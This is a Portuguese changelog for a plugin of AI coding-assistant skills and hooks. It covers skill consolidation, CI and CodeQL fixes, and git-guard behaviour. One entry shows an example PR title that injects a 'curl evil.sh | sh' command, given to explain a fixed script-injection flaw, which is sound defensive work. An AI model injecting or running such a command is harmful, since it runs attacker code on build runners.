# Changelog

## [Unreleased]

_Nada ainda — registre aqui as mudanças da próxima versão sob `### Added` / `### Changed` / `### Fixed` / `### Removed`, movendo-as para uma seção versionada no release._

## [3.4.0] - 2026-07-21

### Changed

- **`rc-create-prd` e `rc-create-techspec`** paravam de escrever o documento para despejá-lo
  inteiro no chat — e só depois salvavam o mesmo conteúdo em disco. O draft agora vai direto
  para `_prd.md`/`_techspec.md` e o usuário recebe **no máximo 8 linhas**: o que o documento
  cobre, as decisões que o moldaram e o que exige decisão dele (no TechSpec, o trade-off
  principal que o Executive Summary já declara). Se não há risco, a skill diz isso em uma
  linha em vez de encher a seção de preocupação genérica. O ciclo de ajuste ficou barato
  junto: B/C edita o arquivo no lugar e relata só o que mudou, em vez de reapresentar o
  documento a cada rodada. O `rc-board` já fazia assim ("Keep the full documents local");
  as duas skills de criação eram a exceção.

## [3.3.1] - 2026-07-21

### Changed

- **`rc-enrichment-prompt`** deixa de ser um one-shot que imprime e encerra. As questões
  em aberto são resolvidas numa rodada de perguntas **antes** de qualquer output — imprimir
  o rascunho e reimprimi-lo depois das respostas custaria ao usuário duas cópias do mesmo
  prompt. Só então o prompt sai na tela, uma vez, e a skill oferece salvar em
  `.rc/prompts/NN-<slug>.md`, numerado a partir do maior `NN` existente — nunca da contagem
  de arquivos, senão um prompt apagado recicla o número e sobrescreve o vizinho. A oferta de
  salvar é incondicional; as questões em aberto são só um passo intermediário.
  Ao passar a escrever em `.rc/`, a skill ganha a seção "Resolving the `.rc` base
  directory" e o boilerplate do tool interativo que bloqueia — os dois contratos que
  toda skill que grava e pergunta já carrega. Modelo sobe para `opus`/`high`: a skill
  agora investiga o repo e conduz um diálogo, não só reescreve texto.

## [3.2.0] - 2026-07-17

Primeira medição do hub contra uma régua de doutrina — e a régua chegou junto. A
`rc-skill-best-practices` tinha 402 palavras de mecânica de spec e nenhum vocabulário
para *single source of truth*, *no-op* ou *sediment*; auditadas as 64 skills contra a
versão nova, 47 falhavam em "uma regra, um dono" (73%). Não eram 47 descuidos: era uma
seção de recap que o template da casa punha no fim de toda skill.

### Added

- **`rc-rust`** — Rust como linguagem: ownership e lifetimes, hierarquia de erros com
  thiserror/anyhow, async com Tokio, design de traits, testes, perf, clippy e rustdoc.
  Era o único gap de stack real — `rc-axum` e `rc-sqlx` se declaram fora de escopo para
  Rust idiomático. Roteada pelo `rc-fullstack-axum-svelte`.
- **`rc-agents-md`** — autoria de AGENTS.md/CLAUDE.md: o teste de aluguel
  (delta/frequência/economia), a escada de escopo e as branches Write/Trim/Gate.
- **`rc-deslop`** — varredura barata que remove slop de IA do diff antes do commit
  (comentário não merecido, try/catch defensivo, cast pra `any`, aninhamento).
- **`plugin-smoke`** ganha 3 checks de doutrina, como **aviso** (não falha): description
  sem anti-trigger, arquivo em `references/` sem ponteiro, arquivo solto na raiz da skill.
  `--warn` lista. FP de cada check medido antes de escrever; um quarto candidato
  (`user-invocable: true` redundante) foi descartado por não ser defeito.
- **`git-guard --selftest`** — 11 casos, offline.

### Changed

- **`rc-skill-best-practices`** reescrita a partir da doutrina upstream: invocação
  (model vs. user-invoked), hierarquia de informação, *completion criterion* contra
  *premature completion*, leading words e failure modes. De 1 para 4 references.
- **Uma regra, um dono** em 37 skills: a seção de recap (`Critical Rules` / `Guardrails`
  / `Must not do` / `Constraints`) foi colapsada quando cada bullet tinha dono — num
  hook, noutra skill, num `references/`, ou num step acima. O ganho não é linha
  economizada: `rc-no-workarounds`, `rc-final-verify` e `rc-testing-anti-patterns`
  passaram a ser **usadas** por ponteiro em vez de parafraseadas por quem não é dona.
- **`rc-git`** de 496 → 152 linhas: citava `references/` zero vezes e duplicava inline o
  conteúdo dos 5 arquivos (587 linhas inalcançáveis). Agora aponta de verdade.
- **`git-guard`** decide em dois níveis via JSON: **ask** para reescrita de histórico e
  push com lease (legítimos, recuperáveis, mas nunca em silêncio) e **deny** para perda
  sem desfazer barato. A mensagem do force-push cru ensina a alternativa com lease.

### Fixed

- **O plugin bloqueava a própria feature**: o `git-guard` negava reescrita de histórico
  incondicionalmente enquanto o `rc-git` ensina exatamente esse fluxo. Todo consumidor
  recebia uma skill que ensinava rebase e um hook que o tornava impossível.
- **Escapes que não alcançavam ninguém**: `RC_DRY_RUN` e `RC_DISABLED_HOOKS` eram
  anunciados pelo `_lib.sh`, e os três guards que bloqueiam (git, db, commit) eram
  justamente os três que não o importavam. Os três agora passam por `rc_hook_active` +
  `rc_block`/`rc_deny`/`rc_ask`.
- **Fóssil do Go**: `rc-create-techspec` exigia "at least one Go interface or struct
  definition" na seção Core Interfaces — numa skill stack-agnostic, num repo
  Rust/SvelteKit. Toda TechSpec gerada recebia essa ordem. Agora pede um tipo no idioma
  do próprio projeto.
- **Referências penduradas**: `find-docs` (citada pelo CLAUDE.md e pelo `rc-video`) e
  `superpowers:*` (citada 3× pelo `rc-systematic-debugging`) apontavam para skills que
  não existem. Trocadas pelo MCP Context7 e por `rc-tdd`/`rc-final-verify`.

## [3.1.0] - 2026-07-16

Stack **Axum + SQLx/Postgres + SvelteKit (Bun)** no hub: skills especializadas, skill
guarda-chuva e boilerplate de deploy VPS (Caddy + systemd + Postgres).

### Added

- **`rc-fullstack-axum-svelte`** — umbrella que roteia para as specialists, fixa
  arquitetura VPS (Caddy → Axum + SvelteKit) e manda usar **Bun ≥ 1.3** no front
  (`bun install` / `bun run` / SSR).
- **`rc-axum`** — Axum 0.8+ (routing, State, middleware, erros tipados, WebSockets,
  security, tests, clippy/fmt).
- **`rc-sqlx`** — SQLx 0.8+ + PostgreSQL (pool, binds, transactions, migrations,
  macros, security, tests).
- **`rc-sveltekit`** — SvelteKit 2 + Svelte 5 (SSR load, form actions, hooks,
  CSRF/CSP, adapter-node rodando com Bun, tests).
- **`docs/stack-vps-fullstack-rust-typescript.md`** — análise de stack (Rust vs TS,
  ranking, VPS KVM 4).
- **`docs/boilerplate-axum-sveltekit-vps/`** — template deployável: Axum API +
  SvelteKit + Postgres (Docker) + Caddy + systemd + scripts (`install-vps`,
  `deploy`, `dev`) com Bun.

### Changed

- Catálogo no `README.md`, `skills/rc/SKILL.md` e `skills-reference.md` lista as
  quatro skills novas e o uso de Bun no front da stack.

## [3.0.0] - 2026-07-15

O corte "pre-slim": o plugin foi auditado contra o uso real (19 dias de histórico de
sessões, referências cruzadas internas e git log) e enxugado de **85 para 57 skills**.
O critério foi evidência, não opinião: o que o fluxo plan→exec→review usa fica; fóssil,
redundância e nicho sem uso saem. A tag `pre-slim` marca o estado anterior — nada se
perde, git guarda. Descriptions de skill custam contexto em toda sessão; o corte devolve
~4.5k tokens por sessão e reduz a chance de ativação de skill errada.

### Added

- **`rc-board`** — fusão de `rc-jira` + `rc-linear` numa skill genérica de board em modo
  PM: `SKILL.md` provider-neutro (discuss/create/update/finalize/refine/execute) +
  `references/linear.md` e `references/jira.md` com o contrato de tooling de cada
  provedor (GMUD incluso no Jira). As chaves `linear_key`/`jira_key` e os sync files
  `_linear-sync.md`/`_jira-sync.md` foram preservados — task files existentes continuam
  válidos.

### Removed

- **Fósseis do fork Compozy** — `agents/README.md` (falava de "embedding Go source
  files" e registrava um agente fantasma `rc:README` em toda sessão), os hooks
  `go-fmt.sh`/`go-mod-guard.sh` (rodavam a cada Edit em repos sem nenhum Go; removidos
  do `hooks.json` e do canal OpenCode), `rc-fix-coderabbit-review` (fluxo da era Codex),
  `rc-app-renderer-systems` e `rc-portal-design` (convenções de codebases alheios).
- **Cluster Go/TUI** (nenhum projeto dessa stack no histórico) — `rc-golang-pro`,
  `rc-bubbletea`, `rc-tui-design`, `rc-tui-glamorous`, `rc-smux`, `rc-smux-rc-pairing`.
- **Redundâncias** — `rc-adversarial-review` e `rc-impl-peer-review` (cobertos por
  `rc-code-review`/`rc-review-round`), `rc-lesson-learned` (coberto por
  `rc-memory`/`rc-lessons`), `rc-to-prompt` (coberto por `rc-enrichment-prompt`),
  `rc-exa-web-search-free` (WebSearch nativo), `rc-minimalist-ui` e
  `rc-redesign-existing-projects` (o par `rc-frontend-design`/`rc-interface-design`
  cobre design de UI).
- **Meta sem uso** — `rc-graphify`, `rc-refactoring-analysis`,
  `rc-extreme-software-optimization`, `rc-qa-report`, `rc-ubs`, `rc-autoresearch`,
  `rc-audit`, `rc-drawio`, `rc-tech-logos`, `rc-find-skills`, `rc-compact`.
- **Extension `rc-idea-factory`** — duplicava os council agents que o plugin já embarca;
  o `/rc-council` cobre o debate multi-advisor. O workflow-guide foi renumerado (a fase
  de ideação opcional saiu do pipeline documentado).

### Changed

- **BREAKING:** quem invocava `rc-jira`/`rc-linear` passa a usar `rc-board` (o provedor
  é detectado pelo MCP conectado). Referências em `rc-card`, `rc-loop` e
  `rc-tasks-workflow` já apontam para a nova skill.
- README, COMMANDS, catálogo (`skills/rc/`) e docs de hooks atualizados; varredura de
  referências penduradas limpa e `plugin-smoke` verde (220 componentes).

## [2.6.0] - 2026-07-14

Release de infraestrutura: o conteúdo do plugin é idêntico ao da 2.5.0. O que mudou é
que o CI passou a **verificar alguma coisa**. Ele era fóssil da era Go/Compozy — montava
Go 1.26.1, Bun e Playwright e rodava `make verify` num repo que não tem nada disso —
então **todo push que tocava `skills/` ou `scripts/` falhava** em `Set up Go with
caching: go.mod not found`. Os "sucessos" eram vacuosos: o filtro de path pulava o job.

### Added

- **CI que roda o gate real** — `node scripts/plugin-smoke.mjs` + `lessons.mjs --selftest`,
  em Node, sem build. O `paths-filter` saiu: ele existia para economizar minuto de build
  Go; o gate roda inteiro em menos de 1s.
- **CodeQL ligado de verdade** (`codeql.yml`). O `codeql-config.yml` existia **sem workflow
  nenhum** — varredura de segurança que ninguém rodava, dando falsa sensação de cobertura —
  e ainda apontava para `cmd/`, `internal/` e `rc.go`, caminhos Go inexistentes: mesmo com
  workflow, escanearia o vazio. Agora analisa o que o repo tem: `javascript-typescript`
  (`scripts/*.mjs`, `opencode/plugin/rc-hooks.ts`) e `actions` (os próprios workflows).
  Push, PR e semanal.
- **`plugin-smoke` — check `toolchain fossil`.** Um workflow não pode montar Go, Bun ou
  `make` sem o manifesto correspondente (`go.mod`/`bun.lock`/`Makefile`) existir no repo.
  Amarrado à realidade, não a uma blacklist de nomes — foi ele que pegou o `auto-docs.yml`.

### Fixed

- **Script injection no `auto-docs.yml`** (achado pelo CodeQL, `actions/code-injection`).
  O título do PR era interpolado direto no `run:`; um título como `"; curl evil.sh | sh; #`
  executaria no runner. Texto não-confiável agora chega ao shell só como variável de
  ambiente, e o `pr_title` vai ao `GITHUB_OUTPUT` via heredoc (um título com quebra de linha
  forjaria outputs extras).
- **Tags mutáveis** (`actions/unpinned-tag`) — `claude-code-action@v1` fixada no SHA
  `f1bd27ca` em `claude.yml` e `auto-docs.yml`.
- **`GH_TOKEN` ausente** no step que roda `gh pr diff`/`gh pr view` do `auto-docs.yml`. Com
  `|| true` em cada chamada, a falha era silenciosa: os arquivos de contexto podiam sair
  vazios e o job seguia como se estivesse tudo certo.

### Removed

- **`auto-docs.yml` — a TASK 1 (release notes).** Mandava rodar
  `go run github.com/rc/releasepr@v0.0.21` — módulo Go de **outro org** — para escrever em
  `.release-notes/`, diretório que não existe, contradizendo o processo de release real
  (CHANGELOG + tag + `gh release`). Nunca poderia ter funcionado. A geração de PR de docs
  (TASK 2) permanece.
- **`.github/actions/`** — as cinco composite actions (`setup-go`, `setup-bun`, `setup-node`,
  `setup-git-cliff`, `setup-release`) estavam órfãs. Os workflows usam só actions oficiais.
- **`.github/versions.yml`** — declarava `go: 1.26.1`, `bun`, `golangci-lint`, `cosign`,
  `syft`; nenhum workflow o lia.

## [2.5.0] - 2026-07-14

Primeira rodada real do `/rc-loop` neste repo. O backlog não foi inventado: saiu do
sensor novo do `plugin-smoke` (`dangling asset`), que achou 8 links que as skills
publicavam e que não resolviam. O gate foi o oráculo — o loop só fechou cada fase
com `node scripts/plugin-smoke.mjs` verde.

### Added

- **`plugin-smoke` — check `dangling asset`.** Todo link markdown ou caminho em crase
  apontando para `references/`, `assets/` ou `scripts/` a partir de um `SKILL.md`/`AGENTS.md`
  precisa existir (na própria skill, na raiz do plugin ou numa skill irmã). Âncoras `#secao`
  são ignoradas; prosa ilustrativa não conta. O gate foi de 107 para **300 componentes**.

### Fixed

- **`rc-autoresearch`** — `eval-guide.md` movido para `references/`. O link estava certo; o
  arquivo é que estava fora da convenção do repo (conteúdo profundo vive em `references/`).
- **`rc-bubbletea`** — removida a "Effects Library". A skill anunciava metaballs, waves,
  rainbow cycling e um `references/effects.md` que **nunca existiram** neste repo (resquício de
  uma skill upstream que empacotava um template Go que RC não distribui). A promessa saiu
  também do bullet de trigger e da `description` do frontmatter — que o gate não enxerga e que
  carrega em toda sessão.
- **`rc-zod`** — `SKILL.md`, `AGENTS.md` e `README.md` apontavam para `references/_sections.md`,
  `assets/templates/_template.md` e `metadata.json`: scaffolding de gerador nunca preenchido.
  Agora apontam só para as regras que existem (`references/{prefix}-{slug}.md`).
- **`rc-skill-best-practices`** — a prosa mandava usar `assets/skill-template.md`; o arquivo
  distribuído é `assets/SKILL.template.md`.
- **`rc-smux-rc-pairing`** — último resquício do fork Compozy: `run-compozy-start.sh` renomeado
  para `run-rc-start.sh` (o próprio banner do script já imprimia o nome novo — o de-fork
  reescreveu o corpo e esqueceu o nome do arquivo). Ganhou o bit de execução que faltava: era o
  único script do diretório em 644, e a skill manda executá-lo direto.

## [2.4.0] - 2026-07-14

O gate deste repo passava verde enquanto a v2.3.0 corrigia bugs que ele deveria ter
pego — validava frontmatter, não coerência. Esta versão transforma o `plugin-smoke`
num sensor de conteúdo: o número de componentes checados foi de 107 para 213.

### Added

- **`plugin-smoke` ganhou dois sensores de conteúdo** — o gate antigo passava com
  `OK (107 components)` enquanto três skills estavam invisíveis e o guia mandava instalar
  um binário que não existe. Validava frontmatter, não coerência. Agora também falha em:
  - **skill órfã** — toda `skills/<x>/SKILL.md` precisa aparecer no catálogo do `README.md`.
    Uma skill fora dele carrega, mas nenhum humano a encontra (foi o que aconteceu com
    `rc-loop`/`rc-roadmap`/`rc-lessons` entre a 2.1.0 e a 2.3.0).
  - **resíduo da era-CLI** — menções prescritivas ao binário/daemon `rc` aposentado
    (`rc sync`, `ACP runtime`, flags inexistentes) nos docs e no hub. Linhas que *negam* o
    CLI ("there is no `rc exec` wrapper") não contam, e o `CLAUDE.md` é isento — a regra
    precisa nomear o que proíbe.

### Fixed

- **`rc-jira` estava órfã** — a skill existe desde a 2.1.0 e nunca entrou no catálogo do
  README. Encontrada pelo próprio check novo, na primeira execução.

## [2.3.0] - 2026-07-14

A camada de loop engineering entrou na 2.1.0 e **nunca foi documentada** — `rc-loop`,
`rc-roadmap` e `rc-lessons` não apareciam no README, no `COMMANDS.md` nem no hub
`skills/rc/SKILL.md`, e o loop era o único fluxo de topo sem command. Só dava para
descobri-lo lendo o CHANGELOG. Esta versão corrige a entrega; o motor não mudou.

### Added

- **`/rc-loop`** — a porta de entrada que faltava. Encadeia os três portões em ordem:
  gate de prontidão (as 4 perguntas de `loop-readiness.md`; qualquer "não" devolve o
  usuário ao `/rc-pipe`) → gate de intenção (sem `.rc/ROADMAP.md`, chama `rc-roadmap`
  `create` e confirma as fases) → só então roda o loop. Antes, `rc-loop` parava seco
  apontando para uma skill que não estava documentada em lugar nenhum.
- **`rc-loop` — seção "Triggering"** (o bloco *Automations* do loop engineering): o
  batimento cardíaco é do **host** (`/loop`, agentes agendados) — RC não traz scheduler,
  cron nem watcher. E a regra: só **fixed loops** (`rc-review-workflow`, `rc-qa-execution`)
  são candidatos a agendamento desatendido; `rc-loop` é um loop **criador** (cada fase
  constrói sobre a anterior), roda com o humano por perto.

### Changed

- **`rc-loop`, `rc-roadmap` e `rc-lessons` agora são descobríveis** — expostas no
  `README.md` (nova seção "Pipeline — autonomous loop (opt-in)"), no `COMMANDS.md`
  (seção "Loop autônomo") e no hub `skills/rc/SKILL.md` (tabela Core Skills + o loop
  como alternativa opt-in às fases 4-7 do pipeline). Em todas, a mesma frase de corte:
  autonomia se conquista — o loop é para migração e build-out grande atrás de um harness
  verde; feature normal continua no `/rc-pipe`.

### Fixed

- **`skills/rc/references/workflow-guide.md` — expurgo da era-CLI.** A doc mais profunda
  do hub ainda exigia o binário `rc` no PATH, descrevia um daemon/runtime ACP na fase de
  execução, mandava rodar `rc sync` antes de arquivar e documentava flags que não existem
  (`--auto-commit`, `--tui`, `--concurrent`, `--persist`) — tudo proibido pelo `CLAUDE.md`.
  As fases 5 (execução), 7 (remediação) e 8 (arquivo) foram reescritas em torno do que de
  fato roda: `rc-tasks-workflow` / `rc-execute-task`, e os próprios arquivos de task/issue
  como fonte da verdade.
- **`config.toml` fantasma.** O guia mandava registrar tipos de task customizados em
  `.rc/config.toml` sob `[tasks].types`, mas o `config-reference.md` já dizia que RC não lê
  mais esse arquivo. Além disso, o `validate-tasks.mjs` só exige que o campo `type` exista —
  não restringe o valor. O texto agora descreve o comportamento real.

## [2.2.1] - 2026-07-12

### Fixed

- **`commit-guard` não bloqueia mais co-autoria humana.** O hook barrava qualquer
  trailer `Co-Authored-By:`, independentemente do co-autor — o que impedia creditar
  uma pessoa num commit pareado, uma prática legítima. A regra agora só dispara
  quando o co-autor é uma IA (`Claude`/`Anthropic`); os demais gatilhos
  (`Generated with Claude`, `Claude Code`, 🤖) seguem inalterados.

## [2.2.0] - 2026-07-12

### Added

- **Grafo navegável entre os artefatos do pipeline.** Seções `Related Artifacts`
  cross-linkam PRD ⇄ TechSpec ⇄ tasks (`rc-create-prd`, `rc-create-techspec`,
  `rc-create-tasks`), o cabeçalho do `_tasks.md` aponta para PRD/TechSpec, e cada
  `issue_NNN.md` de review linka de volta aos artefatos da feature
  (`rc-review-round`). São links markdown relativos com nomes determinísticos
  (`_prd.md`, `_techspec.md`, `_tasks.md`) — clicáveis no host e renderizáveis como
  grafo em editores estilo wiki. Nos reviews o backlink fica no corpo da issue, nunca
  no frontmatter (parseado por tooling estrito).

### Fixed

- **`rc-create-tasks` — link de ADR quebrado no `task-template.md`.** Usava
  `../adrs/adr-NNN.md`, mas os `task_NN.md` ficam na raiz do slug junto de `adrs/`,
  então o `../` subia um nível demais e apontava para `.rc/tasks/adrs/` inexistente.
  Corrigido para `adrs/adr-NNN.md`.

## [2.1.0] - 2026-07-12

### Added

- **Camada de loop engineering** — três skills novas para automatizar o ciclo de
  desenvolvimento quando o harness permite:
  - **`rc-loop`** — driver do loop criador autônomo (só Claude Code): anda o
    `.rc/ROADMAP.md` fase a fase (plan → execute → verify → aprende → fecha) até
    esgotar ou uma fase não ficar verde. Atrás do portão das 4 perguntas de
    prontidão (`references/loop-readiness.md`).
  - **`rc-roadmap`** — autoria/leitura do `.rc/ROADMAP.md` (fases-épico); o passo
    de intenção humana que o loop executa mas não inventa.
  - **`rc-lessons`** — máquina determinística de lições fundamentadas
    (candidate → confirmed em 2 features → quarantine), respaldada por
    `scripts/lessons.mjs`; carrega as confirmadas no plano e registra as novas no
    verify.
- **`scripts/lessons.mjs`** — bookkeeping determinístico das lições
  (add/list/penalize/prune/status, `--selftest`), Node stdlib, sem dependências.
- **`rc-jira`** — integração Jira/Atlassian restaurada e **agnóstica à empresa**:
  discutir, criar/atualizar/finalizar card, refinar em sub-tasks nativas, executar
  com evidência de teste, e GMUD (gestão de mudança com rollback obrigatório) via
  Atlassian MCP.

### Changed

- **`rc-linear` e `rc-jira` — convenções por projeto.** O template de descrição e o
  checklist de DoR deixam de ser fixos e passam a ser resolvidos por
  `.rc/{linear,jira}-conventions.md` (ou perguntar + salvar), com o template
  embutido como default documentado — não mais viesado a uma empresa.
- **`/rc-card`** carrega lições confirmadas e memória compartilhada entre
  sub-issues, registra lições fundamentadas no review e atualiza o handoff local
  por sub-issue.
- **`rc-workflow-memory`** ganha o formato de decisões `AD-NNN` e de entrada de
  Handoff no `MEMORY.md` compartilhado.

## [1.0.1] - 2026-07-07

### Fixed

- Correções do coherence-audit e migração de memória legada.

_Seção documentada retroativamente a partir da tag anotada `v1.0.1`._

## [1.0.0] - 2026-07-07

### Added

- Primeiro release plugin-only: skills, commands, hooks e agents.

_Seção documentada retroativamente a partir da tag anotada `v1.0.0`._

## [0.42.0] - 2026-07-10

### Changed

- **`/rc-card` materializa o workspace local `.rc/tasks/<slug>/`.** O comando deixa
  de só orquestrar skills e passa a persistir os artefatos de implementação: um
  `_techspec.md` **fino** (extrato das decisões técnicas do card + ponteiro para
  ele — cópia local confiável, já que o ticket é untrusted), um `_tasks.md`
  (índice master com `jira_key` em ordem de dependência) e, por tarefa, o
  `task_NN.md` que é o **plano aprovado do `/rc-plano`** carimbado com `jira_key`.
  **Não** gera `_prd.md` — a História refinada já é o PRD. Guardrail novo fixa os
  papéis: **Jira = tracking; `.rc/` local = contrato de implementação**, sem fonte
  de verdade duplicada.

## [0.41.0] - 2026-07-10

### Added

- **`/rc-card [story-key]`** — comando que conduz uma História Jira já refinada
  (ex.: via `rc-council`) de ponta a ponta. Descobre as Tarefas-filhas por
  `parent = <STORY>` com fallback para as keys da seção **Decomposição** da
  descrição, e roda um loop por Tarefa em ordem de dependência:
  `/rc-plano` (aprovação do plano) → executa com o loop verify→fix →
  `/rc-review` → `rc-jira` posta evidência de teste e transiciona o ticket para o
  status correto; roll-up na História no fim. Interativo e portável (pausa para as
  aprovações de plano/review/Jira); trata todo texto de ticket como dado não
  confiável e nunca marca uma Tarefa concluída em gate vermelho ou com achados
  high/critical em aberto. Um repo por execução.

## [0.40.0] - 2026-07-10

### Changed

- **`/rc-review` converge por severidade.** O loop-until-dry agora para quando um
  round não traz issues novos de severidade **alta/crítica** — issues medium/low
  ainda são corrigidos naquele round, mas não disparam um round extra (caro). O
  teto de **3 rounds** é mantido. Atinge `commands/rc-review.md` e
  `skills/rc-review-workflow/SKILL.md` (o schema `ROUND` ganhou `newBlocking`).
- **`/rc-exec` executa em loop verify→fix bounded.** `rc-execute-task` deixou de
  "consertar até resolver" (sem limite) e passou a iterar `gather → fix root cause
  → re-verify` em gate vermelho, até **3 fix cycles** por task, escalando o
  diagnóstico ao `rc-oracle` no último cycle. Se estourar o teto ainda vermelho,
  reporta a task como bloqueada com a evidência — nunca marca completa em gate
  vermelho (guarda contra *premature completion* e *over-ambition*).

## [0.39.1] - 2026-07-08

### Fixed

- **Referências quebradas em `rc-brainstorming`.** A skill apontava para skills
  inexistentes (`writing-plans`, `mcp-builder`); os handoffs agora vão para o
  pipeline real (`rc-create-prd` → `rc-create-techspec` → `rc-create-tasks`) e
  `frontend-design` → `rc-frontend-design`.
- **Nomes de skill não-canônicos em prosa.** `no-workarounds` →
  `rc-no-workarounds` (`rc-execute-task`), `tanstack` → `rc-tanstack`
  (`rc-react`), `test-anti-patterns` → `rc-testing-anti-patterns`
  (`rc-no-workarounds`).

### Changed

- **Leaf-workers agora alcançáveis pelas skills de execução.** As callouts de
  delegação de `rc-execute-task` e `rc-fix-reviews` roteiam lookups de docs para
  `rc-librarian` e apontam `rc-fixer` como upgrade path paralelo (worktree-isolado);
  `rc-fix-reviews` ganhou sua primeira callout de delegação.
- **Anti-triggers adicionados** a `rc-adversarial-review` e
  `rc-fix-coderabbit-review` para desambiguar do restante do cluster de review/fix.
- **`/rc-pipe`** ganhou um passo 0 opcional de warm-up (`rc-codemap`) para baratear
  a exploração das fases seguintes.

## [0.39.0] - 2026-07-08

### Added

- **6 skills novas (padrão hub + `references/`, auto-descobertas por diretório):**
  - `rc-seo` — SEO técnico, on-page e programático (auditoria, otimização de
    conteúdo, geração de páginas em escala).
  - `rc-video` — processamento local com `ffmpeg`, criação de conteúdo
    (Reels/Shorts/YouTube) e integração opcional com VideoDB (SaaS pago).
  - `rc-a11y` — acessibilidade WCAG 2.2 AA (HTML semântico, ARIA, navegação por
    teclado, gestão de foco, contraste, leitores de tela).
  - `rc-sql` — otimização de query (EXPLAIN, índices, N+1) e design de schema;
    read-only por padrão (Rule 9).
  - `rc-observability` — logs, métricas, traces e resposta a incidentes
    (instrumentação, SLOs, postmortem).
  - `rc-resilience` — resiliência event-driven (idempotência, retry/backoff,
    DLQ, poison message, timeouts, circuit breaker).

### Fixed

- **Drift de documentação do path de instincts.** `COMMANDS.md` e `README.md`
  apontavam `.rc/instincts/` para as observações do hook `observe`; corrigido
  para `.rc/memory/observations.jsonl`, que é onde o hook de fato grava.

### Changed

- **Extensão `rc-idea-factory` alinhada à versão do plugin (`0.39.0`).**

## [0.38.0] - 2026-07-08

### Added

- **Skill `rc-python`** — Python 3.12+ idiomático e tipado, com references
  dedicadas: typing/PEP 695, asyncio/`TaskGroup`, packaging com `uv` e testes
  com pytest.
- **Skill `rc-hookify`** — autoria de hooks RC a partir de uma regra em
  linguagem natural: escreve o script fail-open, conecta no `hooks.json`,
  documenta e verifica; inclui referência de eventos de hook.
- **Hook `memory-load` (`SessionStart`)** — warm-start que injeta no contexto um
  resumo limitado de `.rc/memory/` (fatos + learnings) e avisa quando há
  observações a destilar. Nunca bloqueia; silencioso fora de projetos RC.

### Changed

- **Documentação de `model`/`effort`** e contrato de delegação dos agents
  cost-tiered (`skills/rc/references/delegation-contract.md`).
- Ajustes em `rc-memory`, `README.md` e `hooks/README.md` refletindo o hook
  `memory-load`.

## [0.37.2] - 2026-07-08

### Fixed

- **Hook `repair-guidance` disparava falso-positivo em todo edit bem-sucedido.**
  Quando o `tool_response` do PostToolUse vem como objeto (builds atuais do
  Claude Code), o hook fazia `tojson` do objeto inteiro — que num Edit de
  sucesso embute o conteúdo do arquivo (`originalFile`/`structuredPatch`) — e
  rodava o grep de falha nisso. Qualquer arquivo contendo frases como "not
  found", "no changes" ou "old_string" fazia o hook emitir "Edit did not apply"
  mesmo após um edit aplicado. O mesmo afetava o branch `Task` (grep
  "error|failed" contra a saída inteira do subagente). Agora o hook inspeciona
  apenas o texto de status/erro — a string, ou os campos
  `.error`/`.message`/`.errorMessage` do objeto — nunca o objeto serializado.
  Cobertura adicionada ao `--selftest` (`edit-ok-object`, `task-ok-object`).

## [0.37.1] - 2026-07-08

### Changed

- **`model`/`effort` explícitos em 13 skills comportamentais.** Skills que são
  unidade discreta de trabalho passaram a pinar tier (antes herdavam o da
  sessão), alinhadas à convenção das skills de pipeline:
  - **opus/high** — `rc-council`, `rc-adversarial-review`,
    `rc-refactoring-analysis`, `rc-ubs`.
  - **sonnet/high** — `rc-brainstorming`, `rc-graphify`, `rc-qa-execution`,
    `rc-qa-report`, `rc-fix-coderabbit-review`, `rc-autoresearch`.
  - **sonnet/medium** — `rc-enrichment-prompt`, `rc-to-prompt`,
    `rc-lesson-learned`.

  Cobertura de tier sobe de 27 → 40 das 75 skills. As demais 35 (referência de
  biblioteca/design e guidance cross-cutting como `rc-tdd`,
  `rc-systematic-debugging`, `rc-no-workarounds`, `rc-testing-anti-patterns`,
  `rc-skill-best-practices`) seguem sem pin de propósito — rodam no modelo da
  sessão.

## [0.37.0] - 2026-07-07

### Changed

- **Consolidação de skills (82 → 75).** Skills que fatiavam a mesma
  biblioteca/domínio ou tinham o mesmo job foram fundidas na skill primária,
  preservando todo o conteúdo detalhado (os `rules/`/`references/` foram
  movidos para dentro da primária, não descartados):
  - `rc-tanstack` absorveu `rc-tanstack-query-best-practices`,
    `rc-tanstack-router-best-practices` e `rc-tanstack-start-best-practices`
    (agora em `references/{query,router,start}/`).
  - `rc-git` absorveu `rc-git-rebase` (rebase/conflitos; `references/` e
    `scripts/` movidos). O command `rc-commit-msg` permanece intacto.
  - `rc-readme` absorveu `rc-crafting-effective-readmes` (templates/guidance
    para escrever à mão; `references/`, `templates/` e guias movidos).
  - `rc-vercel-react-best-practices` absorveu `rc-vercel-composition-patterns`
    (em `rules/composition/`).
  - `rc-refactoring-analysis` absorveu `rc-architectural-analysis` (auditoria de
    dead code, anti-patterns e type confusion; metodologia em
    `references/architectural-audit.md`).

### Removed

- Skills `rc-tanstack-query-best-practices`, `rc-tanstack-router-best-practices`,
  `rc-tanstack-start-best-practices`, `rc-git-rebase`,
  `rc-crafting-effective-readmes`, `rc-vercel-composition-patterns` e
  `rc-architectural-analysis` como entradas independentes. **Breaking**:
  invocações por esses nomes deixam de resolver — use a skill primária
  correspondente.

## [0.13.0] - 2026-06-22

### Added

- **`rc install --headroom` e listagem de recursos.** O comando `rc install`
  agora instala mais de um recurso: além do `rtk`, suporta `--headroom`
  (instala o pacote Python `headroom-ai[all]` via pipx, pip3 ou pip; imprime
  instruções manuais quando não há instalador Python disponível). Rodar
  `rc install` sem flag lista os recursos instaláveis. A orquestração de
  detecção/instalação foi generalizada e é compartilhada por todos os recursos
  e pelo passo de RTK do `rc setup` (sem duplicação).
- **Tutorial de primeiros passos por recurso.** Após instalar (ou quando o
  recurso já está presente), `rc install` imprime um bloco "Getting started"
  com os comandos principais e o link da documentação oficial. A flag
  `--guide` (ex.: `rc install --rtk --guide`) mostra esse tutorial sob demanda,
  sem detectar nem instalar nada.

## [0.12.0] - 2026-06-22

### Added

- **Comando `rc install --rtk`.** Instala o `rtk` (runtime toolkit) diretamente,
  sem precisar passar pelo fluxo completo de `rc setup`. Detecta o `rtk` no
  `PATH` e reporta a versão quando já presente; quando ausente, roda o instalador
  apropriado para o SO (Homebrew, script oficial ou cargo) ou imprime instruções
  manuais quando nenhum instalador pode rodar. Com `--yes` instala de forma
  desassistida; sem ele, em terminal interativo, confirma antes de instalar. A
  lógica de RTK é compartilhada com `rc setup` (sem duplicação).

## [0.11.1] - 2026-06-21

### Changed

- **Docs e help do `rc init`.** O comando passa a aparecer na lista de
  subcomandos em `rc --help`, e o README ganhou um destaque e a seção
  "Start a new project" documentando `rc init` e a skill `rc-new-project`.

## [0.11.0] - 2026-06-21

### Added

